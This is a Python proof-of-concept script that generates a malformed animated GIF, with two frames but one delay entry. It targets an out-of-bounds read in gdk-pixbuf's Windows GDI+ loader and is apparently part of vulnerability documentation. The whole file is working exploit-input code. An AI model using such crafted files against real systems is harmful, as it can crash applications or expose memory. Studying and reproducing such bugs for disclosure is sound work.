#!/usr/bin/env python3
"""
vuln_001_gen.py - Generate a crafted GIF to trigger OOB read in
gdip_bitmap_get_frame_delay() (io-gdip-utils.c lines 491-499).

NOTE: This PoC is provided for documentation purposes only.
The io-gdip loader is a Windows-only GDI+ loader and is NOT compiled
into gdk-pixbuf on Linux builds (configure.ac: BUILD_GDIPLUS_LOADERS
requires os_win32=yes). The vulnerability cannot be triggered on Linux.

If running on a Windows build of gdk-pixbuf with GDI+ enabled:
Construct a GIF with:
  - 2 animation frames (two Image Descriptor + Image Data blocks)
  - Only 1 Graphic Control Extension (1 delay entry)
  - n_frames=2 but delay array has only 1 entry, so frame=1 is OOB
"""

import struct
import sys


def lzw_compress_min(data, min_code_size=2):
    """Minimal LZW encoding for a single-color image block."""
    # Use a simple approach: clear code + data codes + end code
    clear_code = 1 << min_code_size
    eoi_code = clear_code + 1

    # For simplicity, produce a valid minimal LZW stream
    # for a 1x1 image with color index 0
    import io
    out = io.BytesIO()

    # Pack bits into bytes (LSB first)
    bits = []
    code_size = min_code_size + 1

    def add_code(code, size):
        bits.extend([(code >> i) & 1 for i in range(size)])

    add_code(clear_code, code_size)
    for byte in data:
        add_code(byte, code_size)
    add_code(eoi_code, code_size)

    # Pad to byte boundary
    while len(bits) % 8 != 0:
        bits.append(0)

    # Pack into bytes
    result = bytearray()
    for i in range(0, len(bits), 8):
        byte = 0
        for j in range(8):
            if i + j < len(bits):
                byte |= bits[i + j] << j
        result.append(byte)

    return bytes(result)


def build_gif(output_path):
    """Build a GIF with 2 frames but only 1 Graphic Control Extension."""
    width, height = 2, 2

    # GIF Header
    header = b'GIF89a'

    # Logical Screen Descriptor
    # width(2) height(2) packed(1) bgcolor(1) aspect(1)
    # packed: 0b10000001 = global color table present, depth=1 (4 colors)
    gct_flag = 1
    color_depth = 1  # 2^(depth+1) = 4 colors
    packed = (gct_flag << 7) | (color_depth & 0x07)
    lsd = struct.pack('<HHBBB', width, height, packed, 0, 0)

    # Global Color Table: 4 colors (RGB x4 = 12 bytes)
    gct = (
        b'\x00\x00\x00'  # 0: black
        b'\xFF\xFF\xFF'  # 1: white
        b'\xFF\x00\x00'  # 2: red
        b'\x00\xFF\x00'  # 3: green
    )

    # Netscape Application Extension (loop infinitely)
    netscape_ext = (
        b'\x21\xFF'        # Extension Introducer + App Extension Label
        b'\x0B'            # Block size = 11
        b'NETSCAPE2.0'     # App identifier + auth code
        b'\x03'            # Sub-block size = 3
        b'\x01'            # Sub-block ID
        b'\x00\x00'        # Loop count = 0 (infinite)
        b'\x00'            # Block terminator
    )

    def graphic_control_ext(delay_centiseconds=10):
        """Graphic Control Extension with delay."""
        # \x21\xF9 = GCE introducer
        # block size = 4
        # packed = 0 (no transparency)
        # delay = delay_centiseconds (2 bytes LE)
        # transparent color index = 0
        return struct.pack('<BBBBHBB',
                           0x21, 0xF9,  # Extension + GCE label
                           0x04,        # Block size
                           0x00,        # Packed (no disposal, no user input, no transparency)
                           delay_centiseconds,  # Delay in 1/100 sec
                           0x00,        # Transparent color index (unused)
                           0x00)        # Block terminator

    def image_descriptor(left=0, top=0, w=2, h=2):
        """Image Descriptor block."""
        # 0x2C = Image Separator
        # No local color table
        return struct.pack('<BHHHHB', 0x2C, left, top, w, h, 0x00)

    def image_data(pixel_data, min_code_size=2):
        """LZW-compressed image data with sub-blocks."""
        compressed = lzw_compress_min(pixel_data, min_code_size)
        # Split into sub-blocks of max 255 bytes
        blocks = bytearray()
        blocks.append(min_code_size)
        offset = 0
        while offset < len(compressed):
            chunk = compressed[offset:offset + 255]
            blocks.append(len(chunk))
            blocks.extend(chunk)
            offset += 255
        blocks.append(0x00)  # Block terminator
        return bytes(blocks)

    # Pixel data for 2x2 image (all color index 0)
    pixels = bytes([0, 0, 0, 0])

    # Frame 1: HAS Graphic Control Extension
    frame1_gce = graphic_control_ext(delay_centiseconds=100)  # 1 second delay
    frame1_id = image_descriptor()
    frame1_data = image_data(pixels)

    # Frame 2: NO Graphic Control Extension (intentionally omitted)
    # This means the delay table only has 1 entry (from frame 1's GCE),
    # but n_frames = 2. Accessing delay[1] will be OOB.
    frame2_id = image_descriptor()
    frame2_data = image_data(pixels)

    # GIF Trailer
    trailer = b'\x3B'

    gif = (header + lsd + gct + netscape_ext +
           frame1_gce + frame1_id + frame1_data +
           frame2_id + frame2_data +
           trailer)

    with open(output_path, 'wb') as f:
        f.write(gif)

    print(f"[+] Generated GIF: {output_path} ({len(gif)} bytes)")
    print(f"    Frames: 2, GCE count: 1 (frame 2 has no GCE)")
    print(f"    Expected: OOB read at ((long*)item->value)[1] in gdip_bitmap_get_frame_delay")


if __name__ == '__main__':
    output = sys.argv[1] if len(sys.argv) > 1 else 'vuln_001.gif'
    build_gif(output)
